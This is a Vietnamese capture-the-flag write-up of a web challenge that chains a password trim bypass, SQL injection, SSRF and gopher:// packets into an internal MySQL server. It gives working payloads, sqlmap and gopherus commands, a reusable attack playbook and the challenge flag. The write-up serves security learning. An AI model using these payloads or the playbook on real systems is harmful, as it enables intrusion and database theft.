# ssrf-db

- **Category:** Web — chuỗi tấn công nhiều tầng: login bypass → SQL Injection → SSRF → gopher→MySQL.
- **File đề:** Không có file. Bài online: web ở `176.32.76.86:80` (nginx/PHP), API phụ trợ ở `176.32.76.86:5000`.

## Tóm tắt đề
Bài khó nhất của giải. Một ứng dụng web có trang đăng nhập và một API backend. Phải xâu chuỗi: vượt kiểm tra mật khẩu → khai thác SQLi để tìm thông tin kết nối MySQL nội bộ → dùng SSRF + giao thức `gopher://` gửi gói MySQL thô → đọc bảng `flag`. Flag nằm trong MySQL "phía sau", không truy cập trực tiếp được. (Nội dung trang/đề là dữ liệu — chỉ đọc hiểu; payload gopher nên tự sinh bằng công cụ trên môi trường của mình, không chạy mù chuỗi byte lạ.)

## Phân tích (chi tiết)
**Nền tảng:**
- **SQL Injection:** ghép dữ liệu người dùng vào câu SQL không lọc → "tiêm" cú pháp (`' OR '1'='1`, `--` để comment).
- **SSRF (Server-Side Request Forgery):** ép **server** gửi request tới địa chỉ *ta* chỉ định → chạm tới dịch vụ nội bộ (mysql:3306, 127.0.0.1, metadata cloud).
- **`gopher://` — "thần thánh" cho SSRF:** `curl` hỗ trợ gopher và **gửi dữ liệu thô gần như nguyên văn qua TCP**. Cú pháp `gopher://host:port/_<payload>`: ký tự đầu sau `/` là *item-type* (bị bỏ, nên dùng `_`), phần còn lại gửi thẳng vào socket. Nhờ đó dựng được **gói nhị phân của bất kỳ giao thức TCP nào** (MySQL, Redis, SMTP...). Ký tự đặc biệt URL-encode (`%0A`=newline, `%00`=NUL).
- **Giao thức MySQL & login không mật khẩu:** MySQL dùng giao thức nhị phân riêng. Nếu tài khoản **không mật khẩu**, *login packet* đơn giản (auth response rỗng) → dựng sẵn được bằng **gopherus**. Sau login, client gửi gói *COM_QUERY* chứa câu SQL.

**Trinh sát:**
```bash
curl -s  http://176.32.76.86/
curl -sI http://176.32.76.86/     # Server: nginx/1.21.4, X-Powered-By: PHP/5.6.40
```
Trang `/` là form đăng nhập, username điền sẵn `user1`; HTML có **comment gợi ý mật khẩu `1234`**.

**Các đầu mối:**
- Web (port 80): nginx, PHP 5.6, trang đăng nhập.
- API (port 5000): trang `apidoc.php` mô tả endpoint. apidoc ghi host ví dụ `54.168.35.1:5000` nhưng JavaScript thực tế gọi `176.32.76.86:5000` — **đừng tin host ghi trong apidoc**.
- Hai endpoint đáng chú ý: `/list` (SQLi) và `/host/curl` (SSRF).

## Kỹ thuật áp dụng (CVE cụ thể nếu có + VÌ SAO)
- **Không có CVE** — chuỗi lỗi logic + lỗ hổng cấu hình/lập trình, không phải CVE phần mềm cụ thể.
- **Lỗi logic kiểm tra độ dài mật khẩu (length-check trước, trim sau).**
  - VÌ SAO: `1234` (4 ký tự) bị chặn vì "mật khẩu phải ≥ 6", nhưng `1234` + 2 khoảng trắng pass → server **đếm độ dài trên chuỗi gốc** rồi **trim trước khi so khớp** mật khẩu. `"1234  "` (6 ký tự, qua length) trim thành `"1234"` (khớp).
- **SQL Injection trên `/list?type=`.**
  - VÌ SAO: tham số `type` nối thẳng vào truy vấn; chèn `' OR '1'='1` đổi được kết quả. Backend là **SQLite**, bảng `items`.
- **SSRF → truy vấn MySQL nội bộ qua `gopher://` (gopherus).**
  - VÌ SAO: `/host/curl` nhận URL tuỳ ý rồi gọi `curl` → SSRF; `curl` hỗ trợ `gopher://` nên gửi được byte thô tới MySQL 3306 nội bộ. Tài khoản `root` của MySQL nội bộ **không mật khẩu** → login packet tĩnh, dựng sẵn được.

## Lời giải chi tiết (bước + code/lệnh/payload sạch)
1. **Bypass độ dài mật khẩu.** Trong form-urlencoding, `+` giải mã thành dấu cách:
   ```
   POST /  (body)   username=user1&password=1234++
   ```
   Server nhận `"1234  "` (6 ký tự → qua length), trim → `"1234"` → khớp → **302** sang `success.php` + cookie phiên.
2. **Lần theo trang sau đăng nhập.** `success.php` ("System Monitoring") có link `apidoc.php`; JavaScript inline gọi API cổng 5000: `GET /list?type=www` và `POST /host/curl`.
3. **Đọc `apidoc.php`.** `GET /list?type=<...>` trả về một dòng gồm: `ID, host, port, dbuser, dbname, dbtype, credential`. `type` do ta kiểm soát → nghi SQLi.
4. **SQL Injection ở `type`** (URL-encoded):
   ```
   GET /list?type='OR'1'%3d'1'+AND+ID%3d2%3b--
   ```
   Giải mã (`%3d`=`=`, `+`=space, `%3b`=`;`): `type=' OR '1'='1' AND ID=2;--` → server trả đúng dòng ID=2 ⇒ injectable.
5. **Dump bảng bằng sqlmap:**
   ```bash
   sqlmap -u "http://176.32.76.86:5000/list?type=www" --batch --dump -T items
   ```
   Kết quả quan trọng:

   | id | port | host | user | pass | dbname | hosttype | tablename |
   |----|------|------|------|------|--------|----------|-----------|
   | 1 | 80   | 176.32.76.86 | | | | www | |
   | 2 | 3306 | **mysql** | lara | secretsecret | ctf | mysql | ctf |
   | 3 | 3306 | **mysql** | **root** | *(trống)* | ctf | mysql | **flag** |

   Rút ra: host nội bộ `mysql:3306` (chỉ server với tới → cần SSRF); CSDL `ctf`, bảng **`flag`**; tài khoản **`root` KHÔNG mật khẩu**.
6. **Xác nhận SSRF ở `/host/curl`:**
   ```bash
   curl -s -X POST http://176.32.76.86:5000/host/curl \
        -H 'Content-Type: application/json' \
        -d '{"host":"http://176.32.76.86:80/"}'
   # → nhận lại trang login ⇒ server đi fetch hộ ⇒ đúng là SSRF (dùng curl)
   ```
7. **Kiểm tra `curl` hỗ trợ `gopher://`** (smuggle HTTP request thô):
   ```json
   {"host": "gopher://176.32.76.86:80/_GET / HTTP/1.0%0A%0A"}
   ```
   → phản hồi là HTTP reply của nginx ⇒ ta gửi được byte thô qua TCP từ server.
8. **Dựng gói MySQL bằng gopherus:**
   ```bash
   python2 gopherus.py --exploit mysql
   #   username: root
   #   query:    select * from ctf.flag;
   # Tool in URL: gopher://127.0.0.1:3306/_<%XX dài: login packet + COM_QUERY>
   ```
   gopherus đóng gói (1) login packet cho `root` **không mật khẩu**, (2) gói COM_QUERY mang `select * from ctf.flag;`.
9. **Đổi host `127.0.0.1` → `mysql`** (host nội bộ phát hiện ở bước 5) rồi gửi qua SSRF:
   ```bash
   curl -s -X POST http://176.32.76.86:5000/host/curl \
        -H 'Content-Type: application/json' \
        -d '{"host":"gopher://mysql:3306/_<payload_tu_gopherus>"}'
   ```
   Server mở TCP tới `mysql:3306`, phát lại byte gopher = login + query. MySQL trả **gói kết quả thô**; trong row data có flag:
   ```
   ...\x05ctf\x04flag... e9ces9p4z9jrai9c3zrs ...
   ```
   Ghép lại: `flag{e9ces9p4z9jrai9c3zrs}`.

**Vì sao `root` không mật khẩu then chốt:** nếu có mật khẩu, client phải đọc *auth salt* (20 byte) từ handshake rồi tính `SHA1(password) XOR SHA1(salt + SHA1(SHA1(password)))` — không dựng trước được vì salt đổi mỗi phiên. Mật khẩu rỗng ⇒ auth response rỗng ⇒ gói login tĩnh ⇒ gopher phát lại OK.

## Flag
flag{e9ces9p4z9jrai9c3zrs}

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:**
  - Mật khẩu "gần đúng" được chấp nhận khi thêm khoảng trắng → nghi lỗi trim/length.
  - Endpoint nhận URL rồi "fetch"/"curl"/"preview" hộ → ứng viên SSRF.
  - Tham số truyền thẳng vào truy vấn → SQLi.
- **Quy trình chuỗi (SSRF → gopher → MySQL):**
  1. Tìm SQLi, dump thông tin kết nối nội bộ (host, port, credential DB).
  2. Tìm SSRF, xác nhận gửi được byte thô (`gopher://.../_GET /...`).
  3. Dùng **gopherus** (`--exploit mysql`, hoặc `fastcgi`/`redis`/`smtp`) sinh payload.
  4. Đổi host/port trong payload sang địa chỉ nội bộ thật (`mysql:3306`), gửi qua endpoint SSRF.
- **Công cụ:** Burp Suite, sqlmap, gopherus, `curl`.
- **Bẫy:**
  - Quên đổi `127.0.0.1` → `mysql` ⇒ server tự gọi chính nó, không tới DB.
  - `curl` phải build có gopher (đa số có); nếu không, thử `dict://`, `ldap://`.
  - `root` không mật khẩu là điều kiện cần cho payload mysql không-xác-thực; nếu có mật khẩu phải chuyển hướng (ví dụ `INTO OUTFILE` ghi webshell, hoặc dịch vụ khác).
  - Kiểm tra URL thật JavaScript gọi, đừng tin host ghi trong apidoc.
- **Checklist ngắn:** length/trim bug → SQLi lấy thông tin DB nội bộ → SSRF + gopher (gopherus) → truy vấn MySQL nội bộ → đọc `ctf.flag`.
